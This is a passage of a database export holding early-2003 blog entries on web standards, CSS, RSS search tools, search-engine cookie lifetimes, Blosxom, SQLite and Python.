		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">803</field>
		<field name="title">Yahoo to one day go Google</field>
		<field name="slug">yahooToOneDayGoGoogle</field>
		<field name="body">&lt;p&gt;Jeremy Zawodny drops &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000554.html&quot; title=&quot;Search Engine Imitation&quot;&gt;a so-subtle-that-I-probably-misread-it hint&lt;/a&gt; that the Yahoo search page might some day follow &lt;a href=&quot;http://www.alltheweb.com/&quot;&gt;AllTheWeb&lt;/a&gt; in Google's footsteps.&lt;/p&gt;</field>
		<field name="created">2003-03-04 23:54:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">804</field>
		<field name="title">Credibility and CSS</field>
		<field name="slug">credibilityAndCss</field>
		<field name="body">&lt;p&gt;James Buckley links to a new report on &lt;a href=&quot;http://www.guuui.com/posting.asp?postingID=300&quot;&gt;How people evaluate a web site's credibility&lt;/a&gt;. His &lt;a href=&quot;http://www.ordinary-life.net/blog/archives/001646.php&quot; title=&quot;Street Cred&quot;&gt;comments&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.ordinary-life.net/blog/archives/001646.php&quot;&gt;&lt;p&gt;
Take a look and the first thing you'll notice is that Design was king of the hill with 46.1%, I think its a common misconception with some hardcore usability people that if a site is usable it doesn't matter how it looks, or it's a significantly lower priority, I hope they keep results like this in mind.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;What interested me about this concept is the angle it brings to the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layouts and Netscape 4 debate. A lot of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; advocates (myself included) recomend &quot;hiding&quot; advanced stylesheets from Netscape 4, leaving it to render structural markup using its default styles or a ultra-basic stylesheet provided by the site. The site remains fully usable, all of the content is accessible, but you can garauntee that the site's credibility in the eyes of a potential customer is going to take a serious knock. If you're using leading edge, backwards compatible, structural and standards compliant markup with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; while your competitors are using 3 year old table hacks and hundreds of font tags, Netscape 4 users will see theirs as a professional, credible site and yours as so much unimpressive looking text.&lt;/p&gt;

&lt;p&gt;Of course, the golden rule for this kind of thing is to build for your audience. If your stats show a significant Netscape 4 population (which is thankfully getting less and less likely) you're going to have to break out the tables.&lt;/p&gt;

&lt;p&gt;Incidentally, James is currently &lt;a href=&quot;http://www.ordinary-life.net/blog/archives/001651.php&quot;&gt;working on a redesign&lt;/a&gt;. It's looking really nice, but my one suggestion would be for him to &lt;em&gt;include his surname&lt;/em&gt; somewhere on the site! It took me a good five minutes to track that piece of information down for this entry, and I only ended up finding it thanks's to my own blog's comment archives.&lt;/p&gt;
</field>
		<field name="created">2003-03-06 01:50:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">805</field>
		<field name="title">Scott Andrew redesigns</field>
		<field name="slug">scottAndrewRedesigns</field>
		<field name="body">&lt;p&gt;Scott Andrew has been &lt;a href=&quot;http://www.scottandrew.com/main/2003_03#a000601&quot; title=&quot;Shifting Gears&quot;&gt;hit by redesign fever&lt;/a&gt; as well. His reworking is accompanied by a change in direction:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.scottandrew.com/main/2003_03#a000601&quot;&gt;&lt;p&gt;
For a lot of the past two years, I've been grappling with this dual existence of mine, and I've finally reached a point where, if I were to be run over by a freight train tomorrow, I'd rather be remembered as that songwriter guy than that JavaScript guy. 
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'm not much of a folk/country fan, but I have to admit I rather like his brand of &lt;q cite=&quot;http://www.scottandrew.com/&quot;&gt;urban acoustic pop and weirdo country&lt;/q&gt; music. His blog seemed to lose the web focus a few months ago so it's nice to see him &quot;come out&quot; and show where he's going with his site. Incidentally, the redesign looks great and is especially notable for its warm colour scheme and  non-white background. My girlfriend is mildly dyslexic and finds it hard to read text on white, which has raised my awareness that white is not necessarily the best choice for a background colour (the &lt;a href=&quot;http://www.bcss.info/&quot; title=&quot;Bath University Computer Science Society&quot;&gt;BCSS site&lt;/a&gt; uses a light blue for this very reason). &lt;/p&gt;
</field>
		<field name="created">2003-03-06 02:00:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">806</field>
		<field name="title">Python power</field>
		<field name="slug">pythonPower</field>
		<field name="body">&lt;p&gt;Sam Ruby's &lt;a href=&quot;http://www.intertwingly.net/blog/1237.html&quot; title=&quot;wx3pa&quot;&gt;ultra-simple 3-paned aggregator&lt;/a&gt; is a great example of the power of high level scripting languages. Using the &lt;a href=&quot;http://wxpython.org/&quot;&gt;wxPython&lt;/a&gt; cross-platform &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt; toolkit and Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/projects/rss_parser/&quot;&gt;ultra-liberal RSS Parser&lt;/a&gt; it provides a full application in a mere 107 lines of (highly readable and maintainable) code.&lt;/p&gt;

&lt;p&gt;Linked to from Sam's comments are &lt;a href=&quot;http://diveintomark.org/archives/2002/04/15/investigating_opml.html&quot; title=&quot;Investigating OPML&quot;&gt;Mark Pilgrim's thoughts on OPML&lt;/a&gt; from April last year. I'm not too keen on &lt;acronym title=&quot;Outline Processor Markup Language&quot;&gt;OPML&lt;/acronym&gt;'s &quot;invent attributes as you need them&quot; attitude but I am intrigued by Dave Winer's &lt;a href=&quot;http://davenet.userland.com/2002/06/02/theGooglishWayToDoDirectories&quot; title=&quot;The Googlish Way To DO Directories&quot;&gt;thoughts on using OPML&lt;/a&gt; as the basis for a massive, distributed directory of the web - a sort of decentralised &lt;a href=&quot;http://dmoz.org/&quot; title=&quot;The Open Directory Project&quot;&gt;dmoz&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2003-03-06 02:39:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">807</field>
		<field name="title">Jeff minter blogs</field>
		<field name="slug">jeffMinterBlogs</field>
		<field name="body">&lt;p&gt;Wow. Jeff Minter &lt;a href=&quot;http://gubbeen.dowcarter.com/forum/viewforum.php?f=21&quot;&gt;has a blog&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-06 13:38:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">808</field>
		<field name="title">Spell check in web applications</field>
		<field name="slug">spellCheckInWebApplications</field>
		<field name="body">&lt;p&gt;Sam Ruby has &lt;a href=&quot;http://www.intertwingly.net/blog/1247.html&quot; title=&quot;Preview now with spellcheck&quot;&gt;enabled spell checking&lt;/a&gt; for the preview comment tool on his blog. I wonder how it works... I've lost track of the scripting language Sam uses for Intertwingly (&lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;? Python? Perl?) but I know &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; can be compiled with support for the &lt;a href=&quot;http://www.php.net/manual/en/ref.pspell.php&quot;&gt;Pspell&lt;/a&gt; module.&lt;/p&gt;

&lt;p&gt;Sam's user interface is pretty neat - misspelled words are marked up with a span, underlined in dashed red and have suggested spellings listed in the span's title attribute. Theoretically, it should be possible to build a javascript right-click menu offering alternatives instead (preferably dynamically generated from the list of words in the title attribute using the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;). Actually modifying the preview textarea text based on the menu selection would be quite a lot harder - it could be done with a simple search-and-replace operation, but doing so might change other words with the same &quot;incorrect&quot; spelling without the user realising.&lt;/p&gt;

&lt;p&gt;It would be fun to integrate something like this with a rich text editor, such as the recently announced &lt;a href=&quot;http://www.interactivetools.com/staff/ben/htmlarea3_demo/example.html&quot;&gt;htmlArea 3.0&lt;/a&gt;  that works with Mozilla 1.3b as well as &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; (more information &lt;a href=&quot;http://www.interactivetools.com/iforum/Open_Source_C3/htmlArea_v3.0_-_Alpha_Release_F14/htmlArea_3%3A_Alpha_release_P7101/&quot; title=&quot; htmlArea 3: Alpha release&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2003-03-08 17:23:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">809</field>
		<field name="title">WThRemix entrants</field>
		<field name="slug">wthremixEntrants</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://w3mix.web-graphics.com/&quot;&gt;WThRemix contest&lt;/a&gt; has posted a &lt;a href=&quot;http://w3mix.web-graphics.com/entries.php&quot;&gt;list of submitted entries&lt;/a&gt;. The contest (to design a new homepage for the &lt;a href=&quot;http://www.w3.org/&quot;&gt;W3C&lt;/a&gt;) asked entrants to use valid tableless &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and meet &lt;acronym title=&quot;Web Accessibility Initiative&quot;&gt;WAI&lt;/acronym&gt; accessibility level 1. The entries demonstrate a wide variety of layout and design techniques and are well worth browsing through. The winners will be announced on March 17th.&lt;/p&gt;</field>
		<field name="created">2003-03-08 19:56:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">810</field>
		<field name="title">Roogle</field>
		<field name="slug">roogle</field>
		<field name="body">&lt;p&gt;Scott Johnson has put together a blog search engine with a difference: it indexes &lt;acronym title=&quot;Randomly Syndicated Something?&quot;&gt;RSS&lt;/acronym&gt; feeds rather than crawling the blogs themselves. &lt;a href=&quot;http://www.fuzzygroup.net/roogle/&quot;&gt;Roogle&lt;/a&gt; is still under heavy development (and Scott is &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/03/07.html#a1434&quot; title=&quot;What 10 odd Hours of Hacking Can Produce: An RSS Search Engine&quot;&gt;blogging it&lt;/a&gt; as he goes) but is shaping up to be a very neat tool. If your blog isn't already being indexed, you can add it using &lt;a href=&quot;http://www.fuzzygroup.net/roogle/add.php&quot; title=&quot;Add RSS Feed&quot;&gt;this form&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-08 23:40:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">811</field>
		<field name="title">Thirty five year old cookies</field>
		<field name="slug">thirtyFiveYearOldCookies</field>
		<field name="body">&lt;p&gt;I'm finding myself slightly confused about the Google backlash washing around the blogosphere, which is summarised quite well by &lt;a href=&quot;http://www.gavinsblog.com/2003/03/06.html#a117&quot;&gt;Gavin Sheridan&lt;/a&gt;. Most of the arguments against using Google unsurprisingly centre around privacy issues, in particular the &quot;35 year cookie&quot;. I was under the impression that cookies could only be set for a maximum of a year, but having checked &lt;a href=&quot;http://wp.netscape.com/newsref/std/cookie_spec.html&quot;&gt;Netscape's Cookie Specification&lt;/a&gt; and &lt;a href=&quot;ftp://ftp.rfc-editor.org/in-notes/rfc2965.txt&quot; title=&quot;HTTP State Management Mechanism&quot;&gt;RFC 2965&lt;/a&gt; it appears I was mistaken.&lt;/p&gt;

&lt;p&gt;So let's take a look at the cookies in question, via the Mozilla project's handy &lt;a href=&quot;http://webtools.mozilla.org/web-sniffer/view.cgi?url=http%3A%2F%2Fwww.google.com/&quot; title=&quot;View http://www.google.com/&quot;&gt;Web Sniffer utility&lt;/a&gt; (the front page for this tool is &lt;a href=&quot;http://webtools.mozilla.org/web-sniffer/&quot; title=&quot;View HTTP and HTML Source&quot;&gt;here&lt;/a&gt;):&lt;/p&gt;

&lt;blockquote cite=&quot;http://webtools.mozilla.org/web-sniffer/view.cgi?url=http%3A%2F%2Fwww.google.com/&quot;&gt;&lt;p&gt;&lt;code&gt;
HTTP/1.0 200 OK&lt;br /&gt;
Content-Length: 3403&lt;br /&gt;
Connection: Keep-Alive&lt;br /&gt;
Server: GWS/2.0&lt;br /&gt;
Date: Sun, 09 Mar 2003 14:34:32 GMT&lt;br /&gt;
Content-Type: text/html&lt;br /&gt;
Cache-control: private&lt;br /&gt;
&lt;strong&gt;Set-Cookie: PREF=ID=05ba0c124de8df6e:TM=1047220472:LM=1047220472:S=Ke2RQCqjCEowS1x-; expires=Sun, 17-Jan-2038 19:14:07 GMT; path=/; domain=.google.com&lt;/strong&gt;
&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;There it is - a 35 year cookie. Now let's take a look at some of Google's competitors.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.alltheweb.com/&quot;&gt;AllTheWeb&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://webtools.mozilla.org/web-sniffer/view.cgi?url=http%3A%2F%2Fwww.alltheweb.com/&quot;&gt;&lt;p&gt;&lt;code&gt;
HTTP/1.1 200 OK&lt;br /&gt;
Date: Sun, 09 Mar 2003 14:36:42 GMT&lt;br /&gt;
Server: Apache/1.3.27 (Unix) PHP/4.2.3-atw&lt;br /&gt;
&lt;strong&gt;Set-Cookie: atw-uid=CgVSBj5rUXoAAQnFAwSFAg==; path=/; domain=.alltheweb.com; expires=Sat, 09-Mar-13 02:36:42 GMT&lt;/strong&gt;&lt;br /&gt;
X-Powered-By: PHP/4.2.3-atw&lt;br /&gt;
Last-Modified: Sun, 09 Mar 2003 14:35:00 GMT&lt;br /&gt;
Expires: Thu, 19 Apr 2001 04:25:21 GMT&lt;br /&gt;
Cache-Control: max-age=0, private&lt;br /&gt;
&lt;strong&gt;Set-Cookie: PREF=frschk=1:_lm=1047220602; expires=Fri, 07-Mar-08 14:36:42 GMT; path=/&lt;/strong&gt;&lt;br /&gt;
Connection: close&lt;br /&gt;
Content-Type: text/html; charset=iso-8859-1
&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;That's two cookies - one for 5 years and one for 10 years. Interesting to see that they're using their own modified version of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 4.2.3 :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.teoma.com/&quot;&gt;Teoma&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://webtools.mozilla.org/web-sniffer/view.cgi?url=http%3A%2F%2Fwww.teoma.com/&quot;&gt;&lt;p&gt;&lt;code&gt;
HTTP/1.1 200 OK&lt;br /&gt;
Server: Microsoft-IIS/5.0&lt;br /&gt;
Date: Sun, 09 Mar 2003 14:38:50 GMT&lt;br /&gt;
Connection: Keep-Alive&lt;br /&gt;
Content-Length: 6629&lt;br /&gt;
Content-Type: text/html&lt;br /&gt;
&lt;strong&gt;Set-Cookie: CTST=yes; expires=Sun, 09-Mar-2003 15:03:50 GMT; path=/&lt;/strong&gt;&lt;br /&gt;
Cache-control: private
&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;That cookie lasts for about half an hour and doesn't contain a unique identifier. Plus they're running &lt;acronym title=&quot;Internet Information Server&quot;&gt;IIS&lt;/acronym&gt;!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.altavista.com/&quot;&gt;Altavista&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://webtools.mozilla.org/web-sniffer/view.cgi?url=http%3A%2F%2Fwww.altavista.com/&quot;&gt;&lt;p&gt;&lt;code&gt;
HTTP/1.0 200 OK
&lt;strong&gt;Set-Cookie: AV_POS=pos=1047220999574; path=/; domain=.altavista.com;&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;Set-Cookie: AV_USERKEY=AVS03b87123ae55d80a1c21250000022; expires=Tuesday, 31-Dec-2013 12:00:00 GMT; path=/; domain=altavista.com;&lt;/strong&gt;&lt;br /&gt;
Server: AV/1.0.1&lt;br /&gt;
MIME-Version: 1.0&lt;br /&gt;
Cache-Control: no-cache,no-store,max-age=0&lt;br /&gt;
pragma: no-cache&lt;br /&gt;
Expires: Sun, 09 Mar 2003 14:43:19 GMT&lt;br /&gt;
&lt;strong&gt;Set-Cookie: AV_MKT=1; Domain=altavista.com; Path=/; Expires=Thu, 01-Dec-1994 16:00:00 GMT&lt;/strong&gt;&lt;br /&gt;
Content-Type: text/html; charset=ISO-8859-1&lt;br /&gt;
Content-Length: 10020&lt;br /&gt;
Date: Sun, 09 Mar 2003 14:43:19 GMT
&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;What a mess! There's a session cookie (which only lasts until the browser s closed) recording what looks like the time I first visited the front page, a 10 year cookie with a unique ID and another cookie set to expire in 1994, possibly in an attempt to wipe out cookies set by an older version of the site.&lt;/p&gt;

&lt;p&gt;So what have we learnt? Both AllTheWeb and Altavista set 10 year unique identifier cookies, while Teoma appears not to set any. At the end of the day though, what is the difference between a 10 year and a 35 year cookie? How many people are going to go a whole ten years without losing their browser's cookies, through a browser upgrade, PC upgrade, change of job or just wiping the cookie directory? Thee answer to that question is self evident, so in practise a 10 year unique identifier cookie is just as big an invasion of privacy as a 35 year cookie.&lt;/p&gt;

&lt;p&gt;On the privacy front, AllTheWeb and Altavista are just as guilty as Google.&lt;/p&gt;</field>
		<field name="created">2003-03-09 14:58:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">812</field>
		<field name="title">A plea for pings</field>
		<field name="slug">aPleaForPings</field>
		<field name="body">&lt;p&gt;Blogs I would read a lot more often if only they &lt;a href=&quot;http://newhome.weblogs.com/faq#howCanMyWeblogParticipateInWeblogscom&quot; title=&quot;How can my weblog participate in Weblogs.Com?&quot;&gt;pinged weblogs.com&lt;/a&gt; when they updated:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.decafbad.com/blog/&quot;&gt;Decafbad&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.stopdesign.com/&quot;&gt;Stop Design&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.keithdevens.com/weblog/&quot;&gt;Keith Devens&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.tmtm.com/nothing/&quot;&gt;Tony Bowden&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://afongen.com/blog/&quot;&gt;afongen&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.ashleyit.com/blogs/brentashley/&quot;&gt;Brent Ashley&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.webstandards.org/&quot;&gt;The Web Standards Project&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Without pings, they languish at the bottom of my blogroll where I won't notice or visit them. My blogroll is my only mechanism for keeping track of the blogs that I read regularly - aggregators just don't do it for me, and with tabbed browsing my blogroll is almost as efficient for staying up to date.&lt;/p&gt;

&lt;p&gt;It doesn't have to be weblogs.com - a &lt;a href=&quot;http://blo.gs/ping.php&quot; title=&quot;blo.gs: ping a weblog&quot;&gt;ping to blo.gs&lt;/a&gt; would be just as effective.&lt;/p&gt;</field>
		<field name="created">2003-03-09 19:26:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">813</field>
		<field name="title">Replacing text with images</field>
		<field name="slug">replacingTextWithImages</field>
		<field name="body">&lt;p&gt;Douglas Bowman writes about &lt;a href=&quot;http://www.stopdesign.com/articles/css/replace-text/&quot;&gt;Guiltless Image Use&lt;/a&gt;, describing a technique that uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; to cause text to vanish from the page, then replaces it with a background-image. I &lt;a href=&quot;http://simon.incutio.com/archive/2002/08/01/lumsInCSS&quot;&gt;experimented with this technique&lt;/a&gt; (see comments attached to that entry) myself last year but ended up using image tags inside h1 elements instead. Doug's &lt;a href=&quot;http://www.stopdesign.com/articles/css/replace-text/ex_dropcap.html&quot;&gt;drop cap example&lt;/a&gt; shows that the technique can be applied in interesting ways outside of headers.&lt;/p&gt;</field>
		<field name="created">2003-03-09 20:00:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">814</field>
		<field name="title">Web standards for news sites</field>
		<field name="slug">webStandardsForNewsSites</field>
		<field name="body">&lt;p&gt;Adrian Holovaty's &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/03/10/0224&quot; title=&quot;Standing up for standards&quot;&gt;open email&lt;/a&gt; to Staci D. Kramer of &lt;a href=&quot;http://www.ojr.org/&quot;&gt;Online Journalism Review&lt;/a&gt; makes an excellent case for the adoption of web standards by online news sites. It's written in nice, clear non technical terms and does a good job of explaining the web standards movement in a short space of time. Could definitely be useful for forwarding on to non-technical people (managers for example?) to help spread the word.&lt;/p&gt;</field>
		<field name="created">2003-03-10 12:42:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">815</field>
		<field name="title">Surviving Slashdot</field>
		<field name="slug">survivingSlashdot</field>
		<field name="body">&lt;p&gt;Scott Johnson's &lt;a href=&quot;http://www.fuzzygroup.com/roogle/&quot;&gt;Roogle&lt;/a&gt; RSS search engine &lt;a href=&quot;http://slashdot.org/articles/03/03/09/1650208.shtml&quot; title=&quot;Roogle: RSS Search Engine&quot;&gt;got slashdotted&lt;/a&gt; yesterday, and survived the storm unharmed thanks to Scott's quick thinking server admin Demitrious setting up &lt;a href=&quot;http://www.snert.com/Software/mod_throttle/&quot;&gt;mod_throttle&lt;/a&gt; to help handle the load. Demitrious describes the solution in &lt;a href=&quot;http://blog.apokalyptik.com/node.php?id=6&quot; title=&quot;Fighting the good fight against slashdot...&quot;&gt;this post&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-10 12:48:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">816</field>
		<field name="title">Blosxom rocks</field>
		<field name="slug">blosxomRocks</field>
		<field name="body">&lt;p&gt;I've been hearing a few good things about &lt;a href=&quot;http://www.raelity.org/apps/blosxom/&quot;&gt;Blosxom&lt;/a&gt; recently, so a few days ago I decided to see what all the fuss was about. It's a blogging tool, but it's a very different species from the average system. Firstly, it's only 282 lines of Perl (of which only 135 are actual code). Secondly, rather than having a web interface of some sort to add entries it runs entirely from the file system. You specify a data directory, then create entries by dropping &lt;code&gt;.txt&lt;/code&gt; files in to that directory using your favourite text editor. The first line of each file is the title, the rest of the file is the entry, and the entry's date is taken from the last-modified time of the file.&lt;/p&gt;

&lt;p&gt;So far, so straight forward. Where it gets really clever is the template and category systems. To customise your basic blog you drop a head.html and foot.html file in to your data directory. To customise the display of entries, drop in a story.html file with a few simple replacement variables in it. Categories are again handled by the filesystem - you create directories (or nested subdirectories) for the categories you want and simply drop entries in to those directories instead of the top one.&lt;/p&gt;

&lt;p&gt;Blosxom supports RSS straight out of the box, and can support any custom format you could possibly want thanks to its support for &quot;flavours&quot; - explained &lt;a href=&quot;http://www.raelity.org/apps/blosxom/flavour.shtml&quot; title=&quot;blosxom : flavour&quot;&gt;on the site&lt;/a&gt;. Pretty good for 150 lines of code!&lt;/p&gt;

&lt;p&gt;I doubt I'll switch over to using Blosxom myself, but the cleanness of its design combined with the ease with which it can be extended (Blosxom 2.0 has a very promising &lt;a href=&quot;http://www.raelity.org/apps/blosxom/plugin.shtml&quot;&gt;plugin architecture&lt;/a&gt;) make it an excellent choice for aspiring geek-bloggers. If I'd known about it before I started this blog I may well have used it (or a variant) instead of rolling my own. l.m.orchard is &lt;a href=&quot;http://www.decafbad.com/blog/tech/colophon/oooooa.html&quot; title=&quot;Welcome to 0xDECAFBAD v2.0&quot;&gt;building Decafbad 2.0 around it&lt;/a&gt; and has already done some pretty exciting things.&lt;/p&gt;

&lt;p&gt;I really like the approach of relying on the filesystem to do as much of the work as possible. I suppose most web developers who start with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; (myself included) get stuck in to mySQL databases straight away and never realise quite how much you can do with a bunch of simple text files.&lt;/p&gt;</field>
		<field name="created">2003-03-12 23:31:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">817</field>
		<field name="title">More lightweight software</field>
		<field name="slug">moreLightweightSoftware</field>
		<field name="body">&lt;p&gt;The other toy I've been playing with recently is &lt;a href=&quot;http://www.sqlite.org/&quot;&gt;SQLite&lt;/a&gt;. SQLite is an embeddable &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; database engine written in just under 25,000 lines of (heavily commented) C. Don't let the size fool you - it's phenomenally powerful and is released under a no-holds-barred public domain license that practically begs you to include it in your applications, commercial or not.&lt;/p&gt;

&lt;p&gt;The feature list is pretty awesome - it's &lt;a href=&quot;http://www.sqlite.org/speed.html&quot;&gt;two times faster&lt;/a&gt; than both mySQL and Postgres on simple operations, implements &lt;a href=&quot;http://www.sqlite.org/lang.html&quot; title=&quot;SQL As Understood By SQLite&quot;&gt;an impressive amount&lt;/a&gt; of the SQL92 standard (including transaction support) and has bindings for &lt;a href=&quot;http://www.sqlite.org/tclsqlite.html&quot; title=&quot;The Tcl interface to the SQLite library&quot;&gt;Tcl&lt;/a&gt;, &lt;a href=&quot;http://sourceforge.net/projects/sqlite-php/&quot; title=&quot;SourceForge Project: SQLite-PHP&quot;&gt;PHP&lt;/a&gt;, &lt;a href=&quot;http://search.cpan.org/author/MSERGEANT/DBD-SQLite-0.25/lib/DBD/SQLite.pm&quot; title=&quot;DBD::SQLite&quot;&gt;Perl&lt;/a&gt;, &lt;a href=&quot;http://pysqlite.sourceforge.net/&quot; title=&quot;PySQLite&quot;&gt;Python&lt;/a&gt; and &lt;a href=&quot;http://www.ch-werner.de/javasqlite/&quot; title=&quot;SQLite Java Wrapper/JDBC Driver&quot;&gt;Java&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;That said, the lack of a security model (databases are stored in a single file with no user authentication / permissions system) and the fact that it's very much meant for embedding rather than featuring a client-server model mean it isn't really suitable for web applications. Where it would shine (and where the author intended it to be used) is in applications that would benefit from an ultra fast relational database but don't need the overhead of embedding a large system such as mySQL. The no-strings license makes it a tempting prospect for that kind of work as well.&lt;/p&gt;

&lt;p&gt;Definitely one for the tool box.&lt;/p&gt;</field>
		<field name="created">2003-03-12 23:47:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">818</field>
		<field name="title">More nukes</field>
		<field name="slug">moreNukes</field>
		<field name="body">&lt;p&gt;[PHP|Post|myPHP]-Nuke has to be one of the most-forked open source projects in history! &lt;a href=&quot;http://www.xaraya.org/&quot;&gt;Xaraya&lt;/a&gt; appears to be a fork from &lt;a href=&quot;http://www.postnuke.com/&quot;&gt;Post-Nuke&lt;/a&gt;, which itself forked from &lt;a href=&quot;http://php-nuke.org/&quot;&gt;PHP-Nuke&lt;/a&gt; several years ago (and I'm pretty sure there are more). They've got &lt;a href=&quot;http://docs.xaraya.com/docs/rfcs/rfcindex.html&quot; title=&quot;&quot;&gt;an interesting set of RFCs&lt;/a&gt; on how they intend to build the next big open source content / community management system (nothing about generating pretty URLs yet). While browsing their site I found a link to &lt;a href=&quot;http://phpxref.sourceforge.net/&quot;&gt;PHPXref&lt;/a&gt;, a powerful looking tool for generating &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; source code documentation. Unsurprisingly for such a lot of text munging, it's written in Perl ;)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; I obviously wasn't paying attention: &lt;a href=&quot;http://docs.xaraya.com/docs/rfcs/rfc0023.html&quot;&gt;RFC 0023: Short URL Support&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2003-03-12 23:55:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">819</field>
		<field name="title">Python and micropayments</field>
		<field name="slug">pythonAndMicropayments</field>
		<field name="body">&lt;p&gt;Fredrik Lundh has &lt;a href=&quot;http://effbot.org/zone/librarybook-index.htm&quot; title=&quot;(the eff-bot guide to) The Standard Python Library (Redux)&quot;&gt;started posting&lt;/a&gt; his book &lt;cite&gt;The Standard Python Library&lt;/cite&gt; online, &lt;a href=&quot;http://online.effbot.org/2003_03_01_archive.htm#librarybook&quot; title=&quot;python standard library, live from effbot.org&quot;&gt;in response to&lt;/a&gt; O'Reilly's decision not to publish a second edition of the book. I'd never read it before, but having sampled the first two chapters I'm hooked. It works a bit like a &quot;cookbook&quot;, with a plethora of code samples explained in detail accompanied by tips and tricks relating to the language. The Lazy Import class, which loads a module only when an attribute of the module is called for the first time, is a classic example:&lt;/p&gt;
&lt;blockquote cite=&quot;http://effbot.org/books/librarybook/core-modules.pdf&quot;&gt;&lt;pre&gt;
class LazyImport:
    def __init__(self, module_name):
        self.module_name = module_name
        self.module = None
    def __getattr__(self, name):
        if self.module is None:
            self.module = __import__(self.module_name)
        return getattr(self.module, name)

string = LazyImport(&quot;string&quot;)
print string.lowercase
&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;Frederick plans to release a chapter every Friday until the whole book has been posted. Alernatively, you can &lt;a href=&quot;http://effbot.org/zone/librarybook-order.htm&quot; title=&quot;Buy (the eff-bot guide to) The Standard Python Library, First Edition&quot;&gt;buy the whole 1999 edition&lt;/a&gt; from him as a &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt; file for the princely sum of $5.00, which works out at £3.18 in &lt;acronym title=&quot;Great British Pounds&quot;&gt;GBP&lt;/acronym&gt; via PayPal.&lt;/p&gt;

&lt;p&gt;I think that was my first ever micropayment.&lt;/p&gt;</field>
		<field name="created">2003-03-13 18:25:17</field>
		<field name="comments_open">0</field>
	</row>

